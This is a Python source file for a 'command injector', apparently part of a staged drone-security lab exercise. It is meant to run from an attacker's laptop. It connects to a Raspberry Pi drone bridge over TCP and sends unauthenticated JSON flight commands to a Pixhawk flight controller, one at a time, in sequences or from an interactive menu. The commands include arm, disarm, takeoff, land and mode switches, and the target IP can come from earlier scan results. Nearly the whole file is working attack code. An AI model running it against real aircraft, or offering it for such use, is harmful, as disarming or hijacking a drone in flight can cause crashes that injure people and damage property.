#!/usr/bin/env python3
"""
================================================================
  Command Injector — Phase 3B: Inject Commands via TCP
  Runs on LAPTOP B (Attacker)
================================================================
  Connects to the RPI's TCP bridge (port 5760) and sends
  JSON commands in the EXACT format the system expects:
    {"command": "land"}

  The RPI's process_voice_command() executes these with
  ZERO authentication — as if they came from the real GCS.

  ⚠ CAUTION: This directly controls the Pixhawk flight
    controller. Use ONLY in a safe, controlled environment.

  USAGE:
    python cmd_injector.py --rpi 192.168.1.100
    python cmd_injector.py --rpi 10.193.181.136 --cmd land
    python cmd_injector.py --rpi 10.193.181.136 --interactive
================================================================
"""

import socket
import json
import time
import argparse
import sys

try:
    from colorama import init, Fore, Style
    init()
except ImportError:
    class Fore:
        RED = GREEN = YELLOW = CYAN = MAGENTA = WHITE = RESET = ""
    class Style:
        BRIGHT = RESET_ALL = ""


# All commands accepted by rpi_drone_bridge.py process_voice_command()
KNOWN_COMMANDS = {
    "arm":        "Arm the drone motors",
    "disarm":     "Disarm the drone motors (⚠ DANGEROUS mid-flight!)",
    "takeoff":    "Command takeoff to 10m",
    "land":       "Switch to LAND mode — drone descends and lands",
    "rtl":        "Return To Launch — drone goes home",
    "loiter":     "Switch to LOITER (hover in place)",
    "stabilize":  "Switch to STABILIZE (manual-ish control)",
    "althold":    "Switch to ALT_HOLD mode",
    "guided":     "Switch to GUIDED mode",
    "auto":       "Switch to AUTO mission mode",
    "hold":       "Switch to POSHOLD (position hold)",
}

DANGER_COMMANDS = {"disarm", "arm", "takeoff"}


def print_banner():
    print(f"""
{Fore.RED}{Style.BRIGHT}
╔══════════════════════════════════════════════════════════╗
║         ⚡  COMMAND INJECTOR  ⚡                       ║
║       Enemy Drone Detection — Phase 3B                  ║
║  Injects commands via RPI TCP bridge (port 5760)        ║
╚══════════════════════════════════════════════════════════╝
{Style.RESET_ALL}""")


class CommandInjector:
    def __init__(self, rpi_ip, rpi_port=5760):
        self.rpi_ip = rpi_ip
        self.rpi_port = rpi_port
        self.sock = None
        self.connected = False
        self.injected_count = 0

    def connect(self) -> bool:
        print(f"  {Fore.CYAN}Connecting to RPI at {self.rpi_ip}:{self.rpi_port}...{Style.RESET_ALL}")
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(8)
            self.sock.connect((self.rpi_ip, self.rpi_port))
            self.sock.settimeout(2)
            self.connected = True
            print(f"  {Fore.GREEN}✓ Connected to drone bridge!{Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}⚠ Laptop A may lose its TCP connection now{Style.RESET_ALL}\n")
            return True
        except Exception as e:
            print(f"  {Fore.RED}✗ Connection failed: {e}{Style.RESET_ALL}")
            print(f"  {Fore.YELLOW}  Hint: Laptop A may already hold the TCP connection.")
            print(f"  Disconnect Laptop A first, or restart the RPI bridge.{Style.RESET_ALL}")
            return False

    def inject(self, command: str) -> bool:
        """Send a single command to the RPI bridge."""
        if not self.connected or not self.sock:
            print(f"  {Fore.RED}Not connected!{Style.RESET_ALL}")
            return False

        payload = json.dumps({"command": command}).encode() + b'\n'
        try:
            self.sock.sendall(payload)
            self.injected_count += 1
            danger = command.lower() in DANGER_COMMANDS
            tag = (f"{Fore.RED}[DANGER]{Style.RESET_ALL}" if danger
                   else f"{Fore.GREEN}[SENT]{Style.RESET_ALL}")
            print(f"  {tag} → {Fore.YELLOW}{command}{Style.RESET_ALL} "
                  f"(#{self.injected_count}  raw: {payload.decode().strip()})")

            # Try to read ACK (RPI may not send one, that's fine)
            try:
                resp = self.sock.recv(4096)
                if resp:
                    try:
                        data = json.loads(resp.decode())
                        print(f"         Response: {data}")
                    except Exception:
                        pass
            except socket.timeout:
                pass

            return True
        except Exception as e:
            print(f"  {Fore.RED}Injection error: {e}{Style.RESET_ALL}")
            self.connected = False
            return False

    def inject_sequence(self, commands: list, delay=1.5):
        """Inject a sequence of commands with a delay between each."""
        print(f"  Running sequence: {commands}\n")
        for cmd in commands:
            if not self.inject(cmd):
                print(f"  {Fore.RED}Stopping sequence — connection lost{Style.RESET_ALL}")
                break
            time.sleep(delay)

    def interactive_mode(self):
        """Interactive menu for real-time command injection."""
        print(f"\n  {Fore.RED}{Style.BRIGHT}INTERACTIVE INJECTION MODE{Style.RESET_ALL}")
        print(f"  Type a command name or 'help' to list commands, 'quit' to exit.\n")

        while self.connected:
            try:
                user_input = input(f"  {Fore.RED}inject>{Style.RESET_ALL} ").strip().lower()
            except (KeyboardInterrupt, EOFError):
                break

            if not user_input:
                continue
            if user_input in ("quit", "exit", "q"):
                break
            if user_input in ("help", "?", "h"):
                self._print_commands()
                continue

            if user_input not in KNOWN_COMMANDS:
                print(f"  {Fore.YELLOW}Unknown command. Type 'help' for list.{Style.RESET_ALL}")
                continue

            # Confirm dangerous commands
            if user_input in DANGER_COMMANDS:
                confirm = input(f"  {Fore.RED}⚠ DANGER! '{user_input}' is dangerous. Confirm? [y/N]: {Style.RESET_ALL}")
                if confirm.strip().lower() != 'y':
                    print(f"  Cancelled.")
                    continue

            self.inject(user_input)

        print(f"\n  {Fore.YELLOW}Exiting interactive mode.{Style.RESET_ALL}")

    def _print_commands(self):
        print(f"\n  {Fore.CYAN}Available Commands:{Style.RESET_ALL}")
        for cmd, desc in KNOWN_COMMANDS.items():
            danger_tag = f" {Fore.RED}[DANGER]{Style.RESET_ALL}" if cmd in DANGER_COMMANDS else ""
            print(f"    {Fore.YELLOW}{cmd:12s}{Style.RESET_ALL} — {desc}{danger_tag}")
        print()

    def disconnect(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
        self.connected = False
        print(f"\n  Disconnected. Total injected: {self.injected_count}")


def main():
    print_banner()

    parser = argparse.ArgumentParser(description="RPI Command Injector — Phase 3B")
    parser.add_argument("--rpi", default=None, help="RPI IP address")
    parser.add_argument("--port", type=int, default=5760, help="RPI TCP port")
    parser.add_argument("--cmd", default=None,
                        help="Single command to inject (e.g. land, rtl, disarm)")
    parser.add_argument("--sequence", nargs="+", default=None,
                        help="Sequence of commands (e.g. --sequence land rtl disarm)")
    parser.add_argument("--delay", type=float, default=1.5,
                        help="Delay (s) between sequence commands")
    parser.add_argument("--interactive", "-i", action="store_true",
                        help="Launch interactive injection menu")
    args = parser.parse_args()

    rpi_ip = args.rpi
    if not rpi_ip:
        try:
            import json as _json
            with open("scan_results.json") as f:
                r = _json.load(f)
                if r.get("drone_ips"):
                    rpi_ip = r["drone_ips"][0]
                    print(f"  Using RPI IP from scan: {rpi_ip}")
        except FileNotFoundError:
            pass
    if not rpi_ip:
        rpi_ip = input("  Enter RPI IP address: ").strip()

    injector = CommandInjector(rpi_ip, args.port)

    if not injector.connect():
        sys.exit(1)

    try:
        if args.cmd:
            # Single command
            injector._print_commands() if args.cmd == "help" else injector.inject(args.cmd)
        elif args.sequence:
            # Sequence mode
            injector.inject_sequence(args.sequence, args.delay)
        elif args.interactive:
            # Interactive menu
            injector._print_commands()
            injector.interactive_mode()
        else:
            # Default: show commands and launch interactive
            injector._print_commands()
            injector.interactive_mode()
    finally:
        injector.disconnect()


if __name__ == "__main__":
    main()
